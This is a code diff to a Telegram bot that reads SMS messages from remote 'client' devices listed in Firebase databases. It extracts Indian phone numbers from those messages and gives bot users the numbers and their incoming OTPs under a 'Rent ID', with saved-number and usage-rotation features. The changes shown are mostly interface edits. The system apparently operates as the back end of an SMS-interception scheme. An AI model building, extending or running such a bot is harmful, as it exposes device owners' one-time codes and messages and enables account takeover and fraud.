@@ -100,7 +100,6 @@ def extract_real_sim_numbers(dev_data, msgs):
                 matches = re.findall(pattern, body, re.IGNORECASE)
                 for match in matches: nums.add(match)
 
-    # Fallback: Just grab any 10 digit number if nothing found
     if not nums:
         all_text = " ".join([m.get("message", "") for m in msgs])
         matches = re.findall(r'\b[6-9]\d{9}\b', all_text)
@@ -169,19 +168,16 @@ async def get_numbers_for_country(country_label, uid):
                     online_devices.append((fb, dev_id, dev_data))
     if not online_devices: return None, None, None, []
 
-    # Sort by usage count so we don't repeat until all are used
     usage_data = data.get("device_usage", {})
     online_devices.sort(key=lambda x: usage_data.get(x[1], 0))
     
-    # Pick the least used device
     selected_fb, selected_dev_id, dev_data = online_devices[0]
     
-    # Increment usage
     usage_count = usage_data.get(selected_dev_id, 0)
     data.setdefault("device_usage", {})[selected_dev_id] = usage_count + 1
     save_data(data)
 
-    battery = dev_data.get("battery", "?").replace("%", "")
+    battery = str(dev_data.get("battery", "?")).replace("%", "")
     status = "T" if dev_data.get("status") else "F"
     code = f"{battery}{status}"
     
@@ -282,7 +278,7 @@ async def web_server():
 def main_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
-        [InlineKeyboardButton(text="📜 My Numbers", callback_data="user:my_numbers")]
+        [InlineKeyboardButton(text="⭐ My Numbers", callback_data="user:my_numbers")]
     ])
 
 def admin_kb():
@@ -300,7 +296,7 @@ async def cmd_start(msg: Message):
     data = load_data()
     uid = msg.from_user.id
     if str(uid) not in data["users"]:
-        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time())}
+        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "starred": {}}
         save_data(data)
     
     if uid == data["owner_id"] or uid in data.get("admins", []):
@@ -451,12 +447,12 @@ async def user_country_selected(cq: CallbackQuery):
     
     if not dev_id:
         kb = [[InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-        try: await cq.message.edit_text(f"❌ <b>Not available in range!</b>\n\nNo online devices found. Try refreshing.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+        try: await cq.message.edit_text(f"❌ <b>Not available in range!</b>\n\nNo online devices found right now. Try refreshing.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
         except TelegramBadRequest: pass
         return
         
     degree = "°" * usage if usage > 0 else ""
-    nums_text = "\n".join([f"<code>+91{n}</code>" for n in numbers]) if numbers else "No numbers found in recent messages."
+    nums_text = "\n".join([f"<code>+91{n}</code>" for n in numbers]) if numbers else "No numbers found in recent messages. (Waiting for new OTPs...)"
     
     text = (
         f"📱 <b>Numbers Received</b>\n"
@@ -477,18 +473,11 @@ async def user_country_selected(cq: CallbackQuery):
     }
     data["user_history"].setdefault(str(uid), {})
     for n in numbers: data["user_history"][str(uid)][n] = int(time.time())
-    
-    # Save to user's history
-    if str(uid) in data["users"]:
-        data["users"][str(uid)].setdefault("history", []).append({
-            "dev_id": dev_id, "numbers": numbers, "time": int(time.time())
-        })
-    
     save_data(data)
     
     kb = [
         [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
-        [InlineKeyboardButton(text="⭐ Save / Star", callback_data=f"star:{dev_id}")],
+        [InlineKeyboardButton(text="⭐ Save to My Numbers", callback_data=f"star:{dev_id}")],
         [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"country:{country}")],
         [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num"), InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
     ]
@@ -501,12 +490,13 @@ async def star_device(cq: CallbackQuery):
     uid = cq.from_user.id
     data = load_data()
     
-    if str(uid) not in data["users"]: return await cq.answer("User not found!")
-    
+    if str(uid) not in data["users"]:
+        data["users"][str(uid)] = {"starred": {}}
+        
     starred = data["users"][str(uid)].setdefault("starred", {})
     if dev_id in starred:
         del starred[dev_id]
-        await cq.answer("⭐ Removed from Starred!")
+        await cq.answer("❌ Removed from My Numbers!")
     else:
         lease = data["user_leases"].get(str(uid), {})
         starred[dev_id] = {
@@ -516,7 +506,7 @@ async def star_device(cq: CallbackQuery):
         await cq.answer("⭐ Saved to My Numbers!")
     
     save_data(data)
-    await user_country_selected(cq) # Refresh the previous message
+    await user_country_selected(cq) # Refresh the message to update button
 
 @router.callback_query(F.data == "user:my_numbers")
 async def user_my_numbers(cq: CallbackQuery):
@@ -526,9 +516,9 @@ async def user_my_numbers(cq: CallbackQuery):
     
     if not starred:
         kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-        return await cq.message.edit_text("⭐ <b>No saved numbers yet.</b>\nSave a Rent ID to access it later.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
+        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers yet.\nGo to 'Get Number' and Star a Rent ID to save it here.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
         
-    text = "⭐ <b>My Saved Numbers</b>\n\nTap to re-access OTPs:\n"
+    text = "⭐ <b>My Numbers</b>\n\nTap on a Rent ID to re-access OTPs. (Tap again to remove):\n"
     kb = []
     for dev_id, info in starred.items():
         kb.append([InlineKeyboardButton(text=f"🆔 {dev_id} ({info['country']})", callback_data=f"access:{dev_id}")])
@@ -547,7 +537,6 @@ async def access_saved_device(cq: CallbackQuery):
     if dev_id not in starred:
         return await cq.answer("Device not saved!")
         
-    # Check if online
     is_online = False
     for fb in data.get("firebases", []):
         clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
@@ -557,6 +546,7 @@ async def access_saved_device(cq: CallbackQuery):
             break
             
     if not is_online:
+        # Show Not in range popup
         return await cq.answer("❌ Not in range pls try again after some time", show_alert=True)
         
     info = starred[dev_id]
@@ -585,20 +575,6 @@ async def access_saved_device(cq: CallbackQuery):
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
     except TelegramBadRequest: pass
 
-@router.callback_query(F.data == "user:account")
-async def user_account(cq: CallbackQuery):
-    uid = cq.from_user.id
-    data = load_data()
-    lease = data.get("user_leases", {}).get(str(uid))
-    text = "⚙️ <b>My Active Numbers</b>\n\n"
-    if lease and time.time() < lease["expire_at"]:
-        rem = int((lease["expire_at"] - time.time()) / 60)
-        text += f"🌍 Active: <b>{lease['country']}</b>\n⏳ Expires in: {rem} minutes\n📱 Numbers:\n`{chr(10).join(lease['numbers'])}`"
-    else: text += "❌ No active numbers."
-    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
-    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
-    except TelegramBadRequest: pass
-
 async def main():
     log.info("Bot Started!")
     await web_server() 
@@ -609,4 +585,4 @@ async def main():
     await dp.start_polling(main_bot)
 
 if __name__ == "__main__":
-    asyncio.run(main())1
+    asyncio.run(main())
